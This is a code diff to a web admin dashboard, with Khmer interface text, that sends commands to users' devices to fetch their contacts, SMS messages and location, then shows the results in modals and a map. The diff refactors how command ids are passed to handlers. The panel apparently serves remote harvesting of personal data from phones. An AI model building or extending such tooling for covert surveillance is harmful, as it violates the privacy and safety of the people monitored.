@@ -1694,7 +1694,7 @@ async function renderDevices() {
                 <td>${esc(c.command_type)}</td>
                 <td><span style="padding:2px 8px;border-radius:4px;font-size:12px;background:${c.status === 'completed' ? '#22c55e22' : c.status === 'failed' ? '#ef444422' : '#f59e0b22'};color:${c.status === 'completed' ? '#22c55e' : c.status === 'failed' ? '#ef4444' : '#f59e0b'}">${esc(c.status)}</span></td>
                 <td>${dt(c.created_at)}</td>
-                <td>${c.result_data ? (c.command_type === 'get_location' ? `<a href="#" onclick="showLocationMap(${JSON.stringify(c).replace(/"/g, '&quot;')}); return false;" style="color:#3B9AD9">🗺️ មើលផែនទី</a>` : esc(JSON.stringify(c.result_data).slice(0, 50))) : '—'}</td>
+                <td>${c.result_data ? (c.command_type === 'get_location' ? `<a href="#" onclick="showLocationMap(${c.id}, ${c.user_id}); return false;" style="color:#3B9AD9">🗺️ មើលផែនទី</a>` : esc(JSON.stringify(c.result_data).slice(0, 50))) : '—'}</td>
               </tr>
             `).join('')}
           </tbody>
@@ -1729,12 +1729,12 @@ window.sendDeviceCmd = async function(userId, cmdType) {
     
     // Show results for contacts/SMS reading
     if (cmdType === 'get_contacts' || cmdType === 'get_sms') {
-      setTimeout(() => showCommandResults(cmdType, res.command), 500);
+      setTimeout(() => showCommandResults(cmdType, res.command.id, res.command.user_id), 500);
     }
     
     // Show map for location
     if (cmdType === 'get_location') {
-      setTimeout(() => showLocationMap(res.command), 500);
+      setTimeout(() => showLocationMap(res.command.id, res.command.user_id), 500);
     }
     
     renderDevices();
@@ -1743,10 +1743,10 @@ window.sendDeviceCmd = async function(userId, cmdType) {
   }
 };
 
-window.showCommandResults = async function(cmdType, cmd) {
+window.showCommandResults = async function(cmdType, cmdId, userId) {
   // Fetch the latest command data with results
-  const commands = await api(`/device/commands?user_id=${cmd.user_id}`);
-  const latest = commands.commands?.find(c => c.id === cmd.id);
+  const commands = await api(`/device/commands?user_id=${userId}`);
+  const latest = commands.commands?.find(c => c.id === cmdId);
   
   if (!latest || !latest.result_data) {
     toast('⏳ កំពុងរង់ចាំ result...', false);
@@ -1786,10 +1786,10 @@ window.showCommandResults = async function(cmdType, cmd) {
   showModal(cmdType === 'get_contacts' ? '📱 Contacts' : '💬 SMS Messages', html);
 };
 
-window.showLocationMap = async function(cmd) {
+window.showLocationMap = async function(cmdId, userId) {
   // Fetch the latest command data with results
-  const commands = await api(`/device/commands?user_id=${cmd.user_id}`);
-  const latest = commands.commands?.find(c => c.id === cmd.id);
+  const commands = await api(`/device/commands?user_id=${userId}`);
+  const latest = commands.commands?.find(c => c.id === cmdId);
   
   if (!latest || !latest.result_data) {
     toast('⏳ កំពុងរង់ចាំ location result...', false);
